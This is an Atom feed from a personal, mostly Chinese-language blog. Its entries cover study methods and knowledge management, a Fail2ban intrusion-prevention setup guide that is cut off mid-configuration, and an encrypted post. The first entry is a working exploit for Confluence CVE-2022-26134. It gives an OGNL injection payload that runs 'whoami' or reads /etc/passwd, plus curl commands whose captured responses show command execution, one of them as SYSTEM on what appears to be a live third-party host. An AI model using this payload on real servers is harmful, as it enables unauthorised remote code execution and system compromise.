<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mr.Frame</title>
  
  <subtitle>subtitle</subtitle>
  <link href="https://askding.github.io/atom.xml" rel="self"/>
  
  <link href="https://askding.github.io/"/>
  <updated>2022-06-06T01:19:25.000Z</updated>
  <id>https://askding.github.io/</id>
  
  <author>
    <name>Mr.Frame</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Atlassian_Confluence-CVE-2022-26134.md</title>
    <link href="https://askding.github.io/Kali/Exploit/Atlassian-Confluence-md.html"/>
    <id>https://askding.github.io/Kali/Exploit/Atlassian-Confluence-md.html</id>
    <published>2022-06-06T01:19:25.000Z</published>
    <updated>2022-06-06T01:19:25.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Atlassian-Confluence-CVE-2022-26134"><a href="#Atlassian-Confluence-CVE-2022-26134" class="headerlink" title="Atlassian_Confluence-CVE-2022-26134"></a>Atlassian_Confluence-CVE-2022-26134</h1><p>测试payload</p><pre><code class="bash">$&#123;(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;cat /etc/passwd&quot;).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))&#125;/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/</code></pre><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="bash">curl -I  -k  &quot;http://&#123;host&#125;/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/&quot;HTTP/1.1 302X-ASEN: SEN-16357695X-Confluence-Request-Time: 1654478089003Set-Cookie: JSESSIONID=A34182817EBFE6F7FA068AFB7582E98E; Path=/; HttpOnlyX-XSS-Protection: 1; mode=blockX-Content-Type-Options: nosniffX-Frame-Options: SAMEORIGINContent-Security-Policy: frame-ancestors &#39;self&#39;X-Cmd-Response: confluenceLocation: /login.action?os_destination=%2F%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D%2Findex.action&amp;permissionViolation=trueContent-Type: text/html;charset=UTF-8Transfer-Encoding: chunkedDate: Mon, 06 Jun 2022 01:14:49 GMT </code></pre><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><pre><code class="bash">curl -I -k &quot;https://&#123;host&#125;/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/&quot;HTTP/2 302date: Mon, 06 Jun 2022 01:27:10 GMTcontent-type: text/html;charset=UTF-8cache-control: privateexpires: Thu, 01 Jan 1970 02:00:00 ISTx-asen: SEN-15222703x-confluence-request-time: 1654478830348x-confluence-cluster-node: 31b036c8p3p: CP=&quot;IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT&quot;set-cookie: JSESSIONID=18114A6EC984E7571933004E790DF93F; Path=/; Secure; HttpOnlyx-xss-protection: 1; mode=blockx-content-type-options: nosniffx-cmd-response: nt authority\systemlocation: /login.action?os_destination=%2F%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D%2Findex.action&amp;permissionViolation=truecf-cache-status: DYNAMICexpect-ct: max-age=604800, report-uri=&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;server: cloudflarecf-ray: 716d5d2b3f2bf8a7-NRTalt-svc: h3=&quot;:443&quot;; ma=86400, h3-29=&quot;:443&quot;; ma=86400</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Atlassian-Confluence-CVE-2022-26134&quot;&gt;&lt;a href=&quot;#Atlas</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>职场学习力的读后感</title>
    <link href="https://askding.github.io/Evolution/%E8%81%8C%E5%9C%BA%E5%AD%A6%E4%B9%A0%E5%8A%9B%E7%9A%84%E8%AF%BB%E5%90%8E%E6%84%9F.html"/>
    <id>https://askding.github.io/Evolution/%E8%81%8C%E5%9C%BA%E5%AD%A6%E4%B9%A0%E5%8A%9B%E7%9A%84%E8%AF%BB%E5%90%8E%E6%84%9F.html</id>
    <published>2022-05-29T07:32:21.000Z</published>
    <updated>2022-05-29T07:32:21.000Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none"></div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {document.getElementById("enc_error").innerHTML = "password error!"};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;script src=/js/crypto-js.js&gt;&lt;/script&gt;
&lt;script&gt;
function doDecrypt (pwd, onError) {
	console.log(&#39;in doDecrypt&#39;);
	const txt = document.getE</summary>
      
    
    
    
    <category term="Evolution" scheme="https://askding.github.io/categories/Evolution/"/>
    
    
  </entry>
  
  <entry>
    <title>关于知识</title>
    <link href="https://askding.github.io/Evolution/%E5%85%B3%E4%BA%8E%E7%9F%A5%E8%AF%86.html"/>
    <id>https://askding.github.io/Evolution/%E5%85%B3%E4%BA%8E%E7%9F%A5%E8%AF%86.html</id>
    <published>2022-05-28T10:31:45.000Z</published>
    <updated>2022-05-28T10:31:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="知识分类"><a href="#知识分类" class="headerlink" title="知识分类"></a>知识分类</h2><ul><li>【 】 事实性知识 —术语，要素  </li><li>【 】 概念性知识—结构，分类，原理  </li><li>【 】 程序性知识—技能，算法，使用准则  </li><li>【 】 元认知知识—策略知识，任务知识，自我知识（对自己学习过程的内在监督分析，自我对知识点的反省，应对不同知识做出不同的反应）</li></ul><h2 id="知识晶体"><a href="#知识晶体" class="headerlink" title="知识晶体"></a>知识晶体</h2><p>知识晶体分解-&gt;  <code>&#123;key/:explain&#125;</code></p><blockquote><p>[!done] 如何操作知识晶体<br>将知识晶体组块，逐步实现<strong>自动化</strong>(何时用）、<strong>条件化</strong>(如何用）</p></blockquote><h2 id="知识的管理方法"><a href="#知识的管理方法" class="headerlink" title="知识的管理方法"></a>知识的管理方法</h2><ul><li><input checked="" disabled="" type="checkbox"> 文件夹管理法<br>容易导致分类模糊</li><li><input disabled="" type="checkbox"> <strong>层级标签管理法</strong></li><li><input disabled="" type="checkbox"> 原子化笔记</li></ul><h2 id="知识管理工具"><a href="#知识管理工具" class="headerlink" title="知识管理工具"></a>知识管理工具</h2><blockquote><p>[!tip] <strong>1.大脑是用来思考的，不是用来记忆的。<br>**建立外脑的本质就是体系化你知识的过程！！！</strong><br>外脑(体系化,便管理，易提取)= 存储笔记系统 + 索引笔记系统</p></blockquote><ul><li><input disabled="" type="checkbox"> 大纲类工具</li><li><input disabled="" type="checkbox"> 双链类工具</li><li><input disabled="" type="checkbox"> 卡片类工具</li></ul><p><img src="https://pic1.zhimg.com/80/v2-239f74cc80a691b998ea249a278b24c8_1440w.jpg" alt="知识管理目录结构"></p><ul><li><input disabled="" type="checkbox"> 目录编码原则<br><img src="https://pic4.zhimg.com/80/v2-9bcc6a2ebfa8de026d9da30da6f71f3b_1440w.jpg" alt="目录编码原则"></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;知识分类&quot;&gt;&lt;a href=&quot;#知识分类&quot; class=&quot;headerlink&quot; title=&quot;知识分类</summary>
      
    
    
    
    <category term="Evolution" scheme="https://askding.github.io/categories/Evolution/"/>
    
    
  </entry>
  
  <entry>
    <title>如何高效学习</title>
    <link href="https://askding.github.io/Evolution/%E5%A6%82%E4%BD%95%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0.html"/>
    <id>https://askding.github.io/Evolution/%E5%A6%82%E4%BD%95%E9%AB%98%E6%95%88%E5%AD%A6%E4%B9%A0.html</id>
    <published>2022-05-28T10:23:36.000Z</published>
    <updated>2022-05-28T10:23:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><hr><p>Title: 如何高效学习<br>Date: 2022-04-24 15:01<br>Author: crkmyth1cal<br>Tags:<br>Modified: 2022-04-24 15:01<br>Referer: <a href="https://blog.csdn.net/qq_35664104">https://blog.csdn.net/qq_35664104</a><br>Weather: Unknown location; please try ~39.9059631,116.391248</p><hr><h2 id="每日15-30-15法则"><a href="#每日15-30-15法则" class="headerlink" title="每日15/30/15法则"></a>每日15/30/15法则</h2><p>^b5cab6<br>当你有几个小时空闲的时间，与其埋头苦读，不如把学习时间分散，集中精力完成一些小而有效的学习任务。<br>若每天学习时间很短，但学习频率很高，从长远看你最终能学到的更多。</p><p>把每天分为三个主要的时间段： </p><ul><li><input disabled="" type="checkbox"> 早上 15mins</li><li><input disabled="" type="checkbox"> 中午30mins</li><li><input disabled="" type="checkbox"> 下午 15mins</li></ul><h3 id="早上15mins-第二次复习"><a href="#早上15mins-第二次复习" class="headerlink" title="早上15mins-第二次复习"></a>早上15mins-第二次复习</h3><blockquote><p>[!tip] 早上15mins-第二次复习<br>复习前一晚的笔记， 看看睡了一夜后你还能记得多少。前一天遗留的问题应该成为今天首要解决的知识点。</p></blockquote><h3 id="中午30mins-学习时间"><a href="#中午30mins-学习时间" class="headerlink" title="中午30mins-学习时间"></a>中午30mins-学习时间</h3><blockquote><p>[!tip] 中午30mins-学习时间<br>借助课程和学习资料学习新知识，或者利用这段时间做作业和练习，在这30mins内保持专注、保证效率</p></blockquote><h3 id="下午15mins-第一次复习"><a href="#下午15mins-第一次复习" class="headerlink" title="下午15mins-第一次复习"></a>下午15mins-第一次复习</h3><blockquote><p>[!tip] 下午15mins-第一次复习<br>复习白天学过的知识点，夯实新学的语法和词汇，查漏补缺，第二天早上进行第二次复习。</p></blockquote><h2 id="三天打鱼，四天筛网法则"><a href="#三天打鱼，四天筛网法则" class="headerlink" title="三天打鱼，四天筛网法则"></a>三天打鱼，四天筛网法则</h2><p>若无法每天坚持学习，可以使用如下方法：</p><blockquote><p>[!tip]<br>每天花三天按照 [[#^b5cab6| 15/30/15]] 的计划学习，然后休息四天。<br>在休息日的时候，你只用每天花几分钟回顾一下学过的知识就好，无需学习新内容。</p></blockquote><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Title: 如何高效学习&lt;br&gt;Date: 2022-04-24 15:01&lt;br&gt;Author: c</summary>
      
    
    
    
    <category term="Evolution" scheme="https://askding.github.io/categories/Evolution/"/>
    
    
  </entry>
  
  <entry>
    <title>《认知天性》中关于学习方法的见解</title>
    <link href="https://askding.github.io/Evolution/%E3%80%8A%E8%AE%A4%E7%9F%A5%E5%A4%A9%E6%80%A7%E3%80%8B%E4%B8%AD%E5%85%B3%E4%BA%8E%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95%E7%9A%84%E8%A7%81%E8%A7%A3.html"/>
    <id>https://askding.github.io/Evolution/%E3%80%8A%E8%AE%A4%E7%9F%A5%E5%A4%A9%E6%80%A7%E3%80%8B%E4%B8%AD%E5%85%B3%E4%BA%8E%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95%E7%9A%84%E8%A7%81%E8%A7%A3.html</id>
    <published>2022-05-28T10:11:54.000Z</published>
    <updated>2022-05-28T10:11:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p><a href="https://www.zhihu.com/question/20032766/answer/1349467307">(58 条消息) 有类似专门研究学习方法的书吗? - 知乎 (zhihu.com)</a></p><h1 id="《认知天性》推荐的学习法-lt-检索练习-gt"><a href="#《认知天性》推荐的学习法-lt-检索练习-gt" class="headerlink" title="《认知天性》推荐的学习法-&lt;检索练习&gt;"></a>《认知天性》推荐的学习法-&lt;检索练习&gt;</h1><h2 id="what-什么是检索练习"><a href="#what-什么是检索练习" class="headerlink" title="what-什么是检索练习"></a>what-什么是检索练习</h2><blockquote><p>[!faq] 什么是检索练习</p><ul><li><input disabled="" type="checkbox"> 费曼学习，温故而知新，可以为师也</li></ul></blockquote><h2 id="why-为什么要用检索练习学习知识"><a href="#why-为什么要用检索练习学习知识" class="headerlink" title="why-为什么要用检索练习学习知识"></a>why-为什么要用检索练习学习知识</h2><blockquote><p>[!summary] 从记忆中检索知识有两大显著的好处：</p><ul><li><input disabled="" type="checkbox"> 是明确已知和未知，合理分配精力</li><li><input disabled="" type="checkbox"> 强化新知与已知之间的联系，方便今后回忆检索，可以有效地中止遗忘。</li><li><input disabled="" type="checkbox"> 被忘掉的不是知识本身，而是能让你找到并检索这些知识的线索。</li><li><input disabled="" type="checkbox"> 知识最终将变成条件反射</li></ul></blockquote><h2 id="how-如何高效地进行检索练习"><a href="#how-如何高效地进行检索练习" class="headerlink" title="how-如何高效地进行检索练习"></a>how-如何高效地进行检索练习</h2><blockquote><p>[!faq]  如何提高检索练习的效率?<br><strong>检索某件事物所耗费的努力越多，你学得就越扎实</strong>  正是感觉到学习更吃力时，记忆才更为长久、牢固。</p><ul><li><input disabled="" type="checkbox"> <strong>间隔/重复检索</strong> <ul><li><input disabled="" type="checkbox"> 使用anki学习/复习 定期自测，重新校准已知和未知。可以防止遗忘，强化检索路径，而且对于保存你想要掌握的知识来说至关重要。</li></ul></li><li><input disabled="" type="checkbox"> <strong>穿插/多样检索</strong> , <ul><li><input disabled="" type="checkbox"> 交替学习/复习， 同一事物的多样性，从不同角度学习/复习</li><li><input disabled="" type="checkbox"> 有助于我们更好地学习如何评估背景，以及辨识问题间的差异，从一系列可选的答案中选择并应用正确的解决方案。</li></ul></li><li><input disabled="" type="checkbox"> <strong>反思及细化</strong> <ul><li><input disabled="" type="checkbox"> 为新资料提供一种比喻或视觉形象</li><li><input disabled="" type="checkbox"> 把资料和你已知的东西联系起来，用自己的语言向别人解释，或者解释这些资料与你的课外生活有什么联系。</li></ul></li></ul></blockquote><h1 id="学习误区"><a href="#学习误区" class="headerlink" title="学习误区"></a>学习误区</h1><h2 id="关于艾宾浩斯曲线意义的误解"><a href="#关于艾宾浩斯曲线意义的误解" class="headerlink" title="关于艾宾浩斯曲线意义的误解"></a>关于艾宾浩斯曲线意义的误解</h2><blockquote><p>[!warning] - [ ] 艾宾浩斯曲线毫无意义<br><strong>不同的事物，不同的人，不同的状态，你的记忆效果都会不一样。</strong></p><ul><li><input disabled="" type="checkbox"> <strong>一件事情多快被遗忘，很大程度上取决于这件事对我们的重要程度。</strong></li></ul></blockquote><h2 id="低效学习方式有哪些"><a href="#低效学习方式有哪些" class="headerlink" title="低效学习方式有哪些"></a>低效学习方式有哪些</h2><blockquote><p>[!warning] 低效学习方法<br>那些方法并没有给大脑带来挑战，没法起到巩固的作用，只会让人误以为自己已经掌握了。用今天流行的话讲就是：你只是假装很努力！</p><ul><li><input disabled="" type="checkbox"> 反复阅读 ,  <strong>反复阅读的效果是边际递减的</strong></li><li><input disabled="" type="checkbox"> 划线</li><li><input disabled="" type="checkbox"> 摘抄</li><li><input disabled="" type="checkbox"> 长时间盯着笔记与课本</li><li><input disabled="" type="checkbox"> 记笔记 (指上课时想把老师说的话全部记下来的行为)</li></ul></blockquote><h2 id="为什么无法从不擅长的事情里学到知识？"><a href="#为什么无法从不擅长的事情里学到知识？" class="headerlink" title="为什么无法从不擅长的事情里学到知识？"></a>为什么无法从不擅长的事情里学到知识？</h2><blockquote><p>[!faq] 为什么无法从不擅长的事情里学到知识<br>即便有人能得到负面反馈，他们还必须准确理解为什么会失败。<br>要成功需要做对所有的事情。<br>相反，失败则可以归结到任何一个外部理由上：做不好事情怪工具不合适是很容易的。</p></blockquote><h2 id="为什么穿插练习的效果更好？"><a href="#为什么穿插练习的效果更好？" class="headerlink" title="为什么穿插练习的效果更好？"></a>为什么穿插练习的效果更好？</h2><blockquote><p>[!faq] 为什么穿插练习的效果更好？<br>把不同类型的问题或样本混合起来学习，可以提高你区别问题类型的能力，辨识出同一类型问题的普遍特点，并且能提高你在今后测验或真实环境中的成功率。<br>在现实世界中，你必须能够识别要解决问题的类型，才能运用正确的解决方案。</p></blockquote><h2 id="复习间隔多久为宜？"><a href="#复习间隔多久为宜？" class="headerlink" title="复习间隔多久为宜？"></a>复习间隔多久为宜？</h2><blockquote><p>[!faq] <strong>间隔</strong>检索练习，间隔多久最为合适?<br>从最低限度上说，间隔的时间足够出现一点儿遗忘就对了。<br>在两次练习间至少<strong>间隔一天</strong>应该是不错的做法。</p></blockquote><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&quot;https://www.zhihu.com/question/20032766/answer/1</summary>
      
    
    
    
    <category term="Evolution" scheme="https://askding.github.io/categories/Evolution/"/>
    
    
  </entry>
  
  <entry>
    <title>Fail2ban</title>
    <link href="https://askding.github.io/Tools/Fail2ban.html"/>
    <id>https://askding.github.io/Tools/Fail2ban.html</id>
    <published>2022-05-24T05:16:52.000Z</published>
    <updated>2022-05-24T05:16:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Fail2ban"><a href="#Fail2ban" class="headerlink" title="Fail2ban"></a>Fail2ban</h1><p>Fail2Ban 是入侵检测软件框架，保护计算机免受暴力破解（brute-force attack）。以 Python 语言编写，能运行于具有包（packet）控制或防火墙的 POSIX 系统，如 iptables 或 TCP Wrapper.</p><p>Fail2Ban可以通过描日志文件并用正则匹配分析，然后通过更新防火墙规则来禁止某些有恶意迹象的 IP（密码失败过多，寻求漏洞利用等）来提高服务器安全性。</p><h2 id="fail2ban安装-开机自启"><a href="#fail2ban安装-开机自启" class="headerlink" title="fail2ban安装/开机自启"></a>fail2ban安装/开机自启</h2><pre><code class="shell">apt install fail2banyum install fail2bansystemctl restart fail2bansystemctl enable fail2ban.service # 开机自启</code></pre><h2 id="配置文件-etc-fail2ban"><a href="#配置文件-etc-fail2ban" class="headerlink" title="配置文件 /etc/fail2ban/"></a>配置文件 <code>/etc/fail2ban/</code></h2><ul><li>  <code>/etc/fail2ban/filter.d/</code>：条件文件夹, 内含默认文件，用于定义日志文件内容的过滤规则,其中预设于了 SSH、Nginx、Apache 的监控规则</li><li>  <code>/etc/fail2ban/action.d/</code>：动作文件夹, 发现恶意 IP 后采取的操作，其中预设了许多常用操作，其中预设了 iptables、firewalld、sendmail 等操作</li><li>  <code>/etc/fail2ban/jail.d</code>：配置文件夹, Jail 由 Filter 和 Action 组成，用于定义错误次数、封禁时长、封禁动作等</li><li>  <code>/etc/fail2ban/jail.conf</code> ：定义 fai2ban 自身的日志级别、日志位置等</li></ul><p>当 filter 文件监视到的错误记录条数在 jail 中定义的时间内达到 jail 中定义的次数后，告知系统 iptables 执行封禁动作及封禁时长。在封禁时长到期时，告知 iptables 解除封禁。</p><h3 id="配置过滤规则"><a href="#配置过滤规则" class="headerlink" title="配置过滤规则"></a>配置过滤规则</h3><ul><li><code>/etc/fail2ban/filter.d/&lt;fiter-name&gt;.local</code></li></ul><p>首先设置过滤规则，在 <code>/etc/fail2ban/filter.d/</code> 目前下新建一个 <code>.conf</code> 文件，名字自取，比如我新建的是 <code>nginx-zatp-com.conf</code>，然后进行设置：</p><pre><code class="conf">[Definition]failregex = ignoreregex =</code></pre><p>其中：</p><p><strong>failregex</strong>：表示过滤规则的正则表达式；<br><strong>ignoreregex</strong>：表示忽略规则的正则表达式，可以设置为 <code>.*(webp|svg|jpg|png)</code> 忽略对图片文件的请求，防止图片文件过多误伤；</p><p>而这里要实现我们想要的效果，也有两个选择，配合开篇提到的 Nginx 流控产生的日志文件（error.log）进行匹配过滤或者直接对 Nginx 的访问日志文件（access.log）进行匹配过滤。原理都一样，fail2ban 预置了很多常见服务的日志文件匹配模板，在 <code>/etc/fail2ban/filter.d/</code> 目录下可以找到。如果你修改了日志格式，那么需要<strong>根据你的日志文件格式改写相应的表达式</strong>。</p><p>这里我用 Nginx 的 <code>limit_req_zone</code> 流控模块做一个示例，下面是一条超过限制产生的错误信息：</p><pre><code>2021/10/13 01:02:39 [error] 14174#0: *41792 limiting requests, excess: 5.920 by zone &quot;request&quot;, client: x.x.x.x, server: www.zatp.com, request: &quot;HEAD /?feed=rss HTTP/2.0&quot;, host: &quot;www.zatp.com&quot;</code></pre><p>参考自带的 <code>/etc/fail2ban/filter.d/nginx-limit-req.conf</code> 模板，可以写成下面的表达式：</p><pre><code>[Definition]failregex = ^\s*\[[a-z]+\] \d+#\d+: \*\d+ limiting requests, excess: [\d\.]+ by zone &quot;.*&quot;, client: &lt;HOST&gt;,ignoreregex = </code></pre><p><code>failregex</code> 也可以直接简写为：</p><pre><code>failregex = limiting requests, excess:.* by zone.*client: &lt;HOST&gt;</code></pre><p>其中 <code>&lt;HOST&gt;</code> 是必须包含的，fail2ban 通过这个来获取 IP 地址，测试自定义的规则是否生效：</p><pre><code>fail2ban-regex /var/log/nginx/access.log /etc/fail2ban/filter.d/nginx-zatp-com.conf</code></pre><p>如果成功匹配会返回匹配到的信息：</p><pre><code>Results=======Failregex: 4 total|-  #) [# of hits] regular expression|   1) [4] ^\s*\[[a-z]+\] \d+#\d+: \*\d+ limiting requests, excess: [\d\.]+ by zone &quot;.*&quot;, client: &lt;HOST&gt;,`-Ignoreregex: 0 total</code></pre><h3 id="配置Jail规则"><a href="#配置Jail规则" class="headerlink" title="配置Jail规则"></a>配置Jail规则</h3><p>Fail2ban在安装时会创建两个默认的配置文件:</p><ul><li><code>/etc/fail2ban/jail.d/defaults-debian.conf</code></li><li><code>/etc/fail2ban/jail.conf</code><br>我们不建议直接修改这些文件，因为更新Fail2ban时它们可能会被覆盖。</li></ul><p>Fail2ban将按以下顺序读取配置文件。每个<code>.local</code>文件都会覆盖<code>.conf</code>文件中的设置：</p><ul><li>  <code>/etc/fail2ban/jail.conf</code></li><li>  <code>/etc/fail2ban/jail.d/*.conf</code></li><li>  <code>/etc/fail2ban/jail.local</code></li><li>  <code>/etc/fail2ban/jail.d/*.local</code></li></ul><h4 id="创建自定义配置文件"><a href="#创建自定义配置文件" class="headerlink" title="创建自定义配置文件"></a>创建自定义配置文件</h4><pre><code class="shell">cp /etc/fail2ban/jail.&#123;conf,local&#125;ignoreip = 127.0.0.1/8 ::1 123.123.123.123 192.168.1.0/24</code></pre><ul><li><code>[jail_name]</code> : jail的名称</li><li><code>enabled</code> : 可以设置为<strong>true</strong>或<strong>false</strong>以启用/禁用过滤器</li><li><code>port</code> : 运行服务的端口，如果使用的端口是默认端口，则可以使用服务名称，否则需要明确指定端口号</li><li><code>filter</code> : 位于<code>/etc/fail2ban/filter.d/</code>目录中的过滤器文件的名称(需要与自定义规则里的名称一致，不需要.conf后缀)，其中包含用于解析日志的fileregex信息</li><li><code>logpath</code>: fail2ban检测的日志文件路径</li><li><code>backend</code> : 用于获取日志文件修改的后端 <code>auto</code></li><li><code>ignoreip</code> : 设置白名单ip地址,以空格分隔多个ip/ip段</li><li><code>banaction</code> : 实时锁定行动的类型</li><li><code>action</code> : <code>iptables-allports</code> 如果被触发，执行怎样的脚本？</li><li><code>banaction_allports</code> : Fail2ban阻止每个端口上的远程IP地址</li><li><code>bantime</code> : 锁定时长,默认单位为秒, 默认10m ，值-1将永久禁止IP地址</li><li><code>maxretry</code> : 允许IP失败尝试次数。 默认值设置为5，</li><li><code>findtime</code> : 重试次数之前的持续时间</li></ul><pre><code class="shell">findtime=10mmaxretry=3bantime=1d</code></pre><p>表示 <code>findtime(10m)</code>中内失败次数达到<code>maxretry(3)</code>次则锁定<code>bantime(1d)</code></p><h3 id="邮件通知"><a href="#邮件通知" class="headerlink" title="邮件通知"></a>邮件通知</h3><pre><code class="bash">apt install -y  bsd-mailx sendmailsystemctl restart sendmail.servicecat &lt;&lt;EOF &gt;&gt; /etc/mail.rcset bsdcompatset from= 741474596@qq.comset smtp=smtp.qq.com:465      set 